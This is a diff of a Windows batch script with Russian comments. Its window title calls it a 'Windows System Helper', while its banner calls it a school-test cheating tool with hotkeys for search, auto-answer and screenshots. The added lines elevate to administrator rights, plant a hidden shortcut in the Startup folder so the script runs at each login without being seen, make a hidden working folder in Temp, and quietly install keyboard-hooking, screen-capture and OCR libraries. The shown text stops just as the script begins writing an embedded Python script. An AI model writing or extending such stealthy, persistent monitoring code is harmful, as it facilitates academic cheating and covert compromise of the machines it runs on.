@@ -3,15 +3,29 @@ title Windows System Helper
 color 0A
 mode con cols=85 lines=30
 
+:: ============ ТВОЙ КОД ============
 set USER_CODE={{USER_CODE}}
 set USER_ID={{USER_ID}}
 
+:: ============ ПРОВЕРКА ПРАВ ============
 net session >nul 2>&1
 if %errorLevel% neq 0 (
     powershell -Command "Start-Process '%~f0' -Verb RunAs"
     exit /b
 )
 
+:: ============ ДОБАВЛЕНИЕ В АВТОЗАГРУЗКУ ============
+set STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+set BATCH_PATH=%~f0
+set SHORTCUT_NAME=SystemHelper.lnk
+
+:: Создаём ярлык в автозагрузке (без прав админа)
+powershell -Command "$WS = New-Object -ComObject WScript.Shell; $SC = $WS.CreateShortcut('%STARTUP_DIR%\%SHORTCUT_NAME%'); $SC.TargetPath = '%BATCH_PATH%'; $SC.WorkingDirectory = '%~dp0'; $SC.Arguments = '--hidden'; $SC.Save()" >nul 2>&1
+
+:: Скрываем ярлык (чтобы не светился)
+attrib +h "%STARTUP_DIR%\%SHORTCUT_NAME%" >nul 2>&1
+
+:: ============ ЗАГОЛОВОК ============
 cls
 echo ================================================
 echo    🔥 MY TEST X ULTIMATE - ШКОЛЬНАЯ ВЕРСИЯ
@@ -20,24 +34,37 @@ echo    ⚡ Ctrl+Shift+F12 - ввести код
 echo    ⚡ F8 - поиск | F9 - авто | F10 - скрин
 echo    ⚡ F11 - стат | Fn+Del - удаление
 echo ================================================
+echo    ✅ Добавлено в автозагрузку
+echo ================================================
 echo.
 
+:: ============ СОЗДАЁМ СКРЫТУЮ ПАПКУ ============
 set INSTALL_DIR=%USERPROFILE%\AppData\Local\Temp\syshelper
 mkdir "%INSTALL_DIR%" 2>nul
 mkdir "%INSTALL_DIR%\screenshots" 2>nul
 mkdir "%INSTALL_DIR%\cache" 2>nul
 
+:: ============ СОХРАНЯЕМ КОД ============
 echo %USER_CODE% > "%INSTALL_DIR%\user.code"
 
+:: ============ ПРОВЕРЯЕМ PYTHON ============
 python --version >nul 2>&1
 if %errorLevel% neq 0 (
     echo ❌ Python не найден!
+    echo.
+    echo ============ РЕШЕНИЕ ============
+    echo 1. Скачай portable Python с python.org
+    echo 2. Положи в папку PythonPortable на флешке
+    echo 3. Запусти снова
+    echo ================================
     pause
     exit /b
 )
 
+:: ============ УСТАНАВЛИВАЕМ БИБЛИОТЕКИ ============
 python -m pip install --quiet keyboard pyautogui pygetwindow pywin32 pillow pytesseract requests
 
+:: ============ СОЗДАЁМ PYTHON-СКРИПТ ============
 set PY_SCRIPT=%TEMP%\mxt_%random%.py
 
 (
